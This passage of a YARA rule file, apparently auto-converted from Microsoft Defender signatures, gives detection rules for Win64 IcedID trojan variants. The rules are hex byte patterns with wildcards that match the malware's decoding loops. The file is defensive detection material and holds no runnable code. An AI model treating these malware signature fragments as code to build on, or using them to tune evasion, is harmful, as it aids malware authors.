        $x_1_1 = {48 29 c2 8b 85 ?? ?? ?? ?? 0f af 85 ?? ?? ?? ?? 0f af 85 ?? ?? ?? ?? 48 98 48 29 c2 48 89 d0 0f b6 84 05 ?? ?? ?? ?? 44 31 c8 41 88 00 48 83 85 ?? ?? ?? ?? ?? 48 8b 85 ?? ?? ?? ?? 48 39 85}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_LE_2147904605_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.LE!MTB"
        threat_id = "2147904605"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {48 8b c1 b9 ?? ?? ?? ?? 48 f7 f1 48 8b c2 0f b6 44 04 ?? 8b 8c 24 ?? ?? ?? ?? 33 c8 8b c1 48 63 4c 24 ?? 48 8b 54 24 ?? 88 04 0a eb}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_YAC_2147905796_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.YAC!MTB"
        threat_id = "2147905796"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {03 d0 49 63 c4 41 83 c4 01 48 63 ca 48 6b c9 17 48 03 c8 48 8b 44 24 ?? 42 0f b6 8c 31 ?? ?? ?? ?? 41 32 4c 00 ff 43 88 4c 18}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_AMMF_2147906486_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.AMMF!MTB"
        threat_id = "2147906486"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {48 8b c6 48 f7 e1 48 c1 ea [0-10] 48 2b c8 0f b6 44 0d ?? 41 30 41 fe 49 ff cb}  //weight: 1, accuracy: Low
        $x_1_2 = {48 f7 e1 48 c1 ea [0-10] 48 2b c8 49 03 cb 0f b6 44 0c ?? 42 32 44 13 ff 41 88 42 ff 41 81 f9}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule Trojan_Win64_IcedID_KR_2147906653_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.KR!MTB"
        threat_id = "2147906653"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {48 63 c8 48 8b c6 48 f7 e1 48 c1 ea ?? 48 8d 04 d2 48 03 c0 48 2b c8 0f b6 44 0c ?? 41 30 41 ?? 49 ff cb 0f 85}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_HS_2147906992_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.HS!MTB"
        threat_id = "2147906992"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {48 63 c8 49 8b c6 49 83 c2 ?? 48 f7 e1 48 c1 ea ?? 48 6b c2 ?? 48 2b c8 0f b6 44 0d ?? 41 30 04 18 48 ff ce}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_RE_2147912754_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.RE!MTB"
        threat_id = "2147912754"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {8b 0c 24 8d 0c 8d ?? ?? ?? ?? 3a d2 74 ?? 8b 44 84 ?? 33 c1 e9}  //weight: 1, accuracy: Low
        $x_1_2 = {0f b6 8c 0c ?? ?? ?? ?? 33 c1 e9 ?? ?? ?? ?? 48 63 44 24 ?? 48 8b 8c 24 ?? ?? ?? ?? 66 3b c9 74}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_HD_2147919392_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.HD!MTB"
        threat_id = "2147919392"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_5_1 = {0f b6 44 04 ?? 8b 4c 24 ?? 3a c9 0f 84 ?? ?? ?? ?? 33 c1 48 63 4c 24 ?? e9 ?? ?? ?? ?? 25 ?? ?? ?? ?? 2b c2 e9 ?? ?? ?? ?? 48 63 4c 24 ?? 0f b6 4c 0c ?? e9 ?? ?? ?? ?? 81 7c 24 ?? ?? ?? ?? ?? 0f 8d}  //weight: 5, accuracy: Low
        $x_2_2 = {48 8b c1 e9 ?? ?? ?? ?? 48 ff c1 8b 54 24 ?? eb ?? 48 f7 f9 48 8b c2 eb}  //weight: 2, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_5_*))) or
            (all of ($x*))
        )
}

